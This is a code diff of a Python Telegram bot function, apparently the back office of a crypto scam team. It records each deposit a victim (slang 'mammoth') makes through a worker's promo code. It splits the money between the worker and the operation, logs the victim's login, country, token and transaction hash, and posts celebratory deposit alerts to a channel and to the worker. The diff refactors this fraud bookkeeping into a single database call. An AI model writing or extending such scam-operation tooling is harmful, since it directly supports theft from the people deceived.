@@ -292,64 +292,26 @@ async def send_newMessage(data: dict):
     
     
 async def send_newDeposit(data: dict):
-    today = datetime.now()
-
-    cursor.execute(f"SELECT user_id FROM promocodes WHERE name = ?", (data['mammothPromo'], ))
-    worker_id = cursor.fetchone()[0] #Получил user_id по промокоду
     
-    worker_username = DB.get(user_id=worker_id, data="username", table=DB.users_table) #Username воркера получил
-    worker_perc = DB.get(user_id=worker_id, data="percentage", table=DB.users_table) #Процент воркера получил
+    promocode_info = DB.get_user_where_promocode(data['mammothPromo'])
+    user_info = DB.get_user_where_user_id(promocode_info.user_id)
     
-    cursor.execute(f"SELECT activation_count FROM promocodes WHERE name = ?", (data['mammothPromo'], ))
-    old_promo_activations = cursor.fetchone()[0] # Получил колличество активаций промо по промокоду activation_count
+    user_id = promocode_info.user_id #Получил user_id по промокоду
     
-    cursor.execute(f"SELECT deposit FROM promocodes WHERE name = ?", (data['mammothPromo'], ))
-    old_promo_deposits = cursor.fetchone()[0] # хуй пойми че это ну наверное старое колличество депов на промике
+    worker_username = user_info.bot_username #Username воркера получил
     
-    old_worker_balance = DB.get(user_id=worker_id, data="balance", table=DB.users_table)
-    old_worker_all_time_balance = DB.get(user_id=worker_id, data="all_time_balance", table=DB.users_table)
-    old_bot_all_time_balance = DB.get_without_user_id(data="all_time_balance", table=DB.bot_info)
-    old_bot_all_promo_activations = DB.get_without_user_id(data="promo_activations", table=DB.bot_info)
-    old_bot_deposits = DB.get_without_user_id(data="deposits", table=DB.bot_info)
-    
-    # Высчитываем новые значения
-    new_bot_all_promo_activations = int(old_bot_all_promo_activations) + 1
-    new_promo_activations = int(old_promo_activations) + 1
-    new_promo_deposits = float(old_promo_deposits) + float(data['amountUsd'])
-    new_worker_balance = float(old_worker_balance + (float(data['amountUsd'] * worker_perc) / 100))
-    new_worker_all_time_balance = float(old_worker_all_time_balance) + (float(data['amountUsd'] * worker_perc) / 100)
-    new_bot_all_time_balance = float(old_bot_all_time_balance) + float(data['amountUsd'])
-    new_bot_deposits = int(old_bot_deposits) + 1
-
-    # Округляем до 2 цифр после точки
-    new_worker_balance = round(new_worker_balance, 2)
-    new_promo_deposits = round(new_promo_deposits, 2)
-    new_worker_all_time_balance = round(new_worker_all_time_balance, 2)
-    new_bot_all_time_balance = round(new_bot_all_time_balance, 2)
-
-    # Загружаем данные в БД
-    DB.update(user_id=worker_id, column="balance", new_data=new_worker_balance, table=DB.users_table)
-    DB.update(user_id=worker_id, column="all_time_balance", new_data=new_worker_all_time_balance, table=DB.users_table)
-    
-    DB.update_without_user_id(column="all_time_balance", new_data=new_bot_all_time_balance, table=DB.bot_info)
-    DB.update_without_user_id(column="promo_activations", new_data=new_bot_all_promo_activations, table=DB.bot_info)
-    DB.update_without_user_id(column="deposits", new_data=new_bot_deposits, table=DB.bot_info)
-    
-    
-    cursor.execute(f"UPDATE promocodes SET activation_count = ? WHERE name = ?", (new_promo_activations, data['mammothPromo']))
-    cursor.execute(f"UPDATE promocodes SET deposit = ? WHERE name = ?", (new_promo_deposits, data['mammothPromo']))
-    conn.commit()
-
-    # Сохраняем депозит в таблицу
-    cursor.execute(
-            'INSERT INTO deposits (worker_id, amount, mamonth_login, token, domain, date, hash, country, amountUSD)'
-            'VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
-            (worker_id, float(data['amount']), str(data["mammothLogin"]), str(data["token"]), str(data["domain"]), today, str(data["txHash"]), str(data["mammothCountry"]), str(data["amountUsd"])))
-
-    conn.commit()
+    DB.update_rrr(
+        user_id=promocode_info.user_id,
+        promocode=data['mammothPromo'],
+        activation_count=1,
+        deposit=int(float(data['amountUsd'] * 70) / 100),
+        worker_balance=int(float(data['amountUsd'] * user_info.percentage) / 100),
+        domain=data['domain'],
+        data=data
+    )
 
     
-    
+
     message_to_channel = f"""
 <b>🔥 Хо-хо-хо! Новый депозит!
 ├🦋Никнейм воркера: <code>{worker_username if worker_username else '*****'}</code>
@@ -363,7 +325,7 @@ async def send_newDeposit(data: dict):
         parse_mode='HTML'
     )
     try:
-        res = DB.get_notif_user(worker_id)
+        res = DB.get_notif_user(user_id)
         if res[1] == 1:
             message_to_user = f'''
 <b>🔥 Хо-хо-хо! Вам пришел депозит!</b>
@@ -376,7 +338,7 @@ async def send_newDeposit(data: dict):
 └🔐Домен: <code>{data['domain']}</code></b></blockquote>
         '''
             await bot.send_message(
-                chat_id=worker_id,
+                chat_id=user_id,
                 text=message_to_user,
                 parse_mode='HTML'
             )
